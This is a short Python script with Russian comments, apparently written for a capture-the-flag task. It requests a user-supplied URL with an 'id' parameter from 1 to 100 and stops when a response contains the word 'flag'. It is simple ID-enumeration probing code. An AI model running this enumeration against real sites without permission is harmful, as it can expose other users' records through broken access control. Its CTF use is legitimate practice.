import sys
import requests

# Простая проверка, чтобы не ловить IndexError
if len(sys.argv) < 2:
    print("Использование: python brute.py <url>")
    sys.exit()

target_url = sys.argv[1]

for i in range(1, 101):
    params = {'id': i} # Исправлено на словарь
    try:
       r = requests.get(target_url, params=params)

       # Добавим принт, чтобы видеть прогресс в консоли
       print(f"Проверяю ID: {i}", end="\r") 

       if 'flag' in r.text:
           print(f"\n[+] Флаг найден на ID {i}!")
           print(f"Текст ответа: {r.text}")
           break
           
    except Exception as e:
        print(f'\nОшибка при запросе на ID {i}: {e}')
        # Здесь лучше не делать break, чтобы из-за одной ошибки не стопился весь перебор
        continue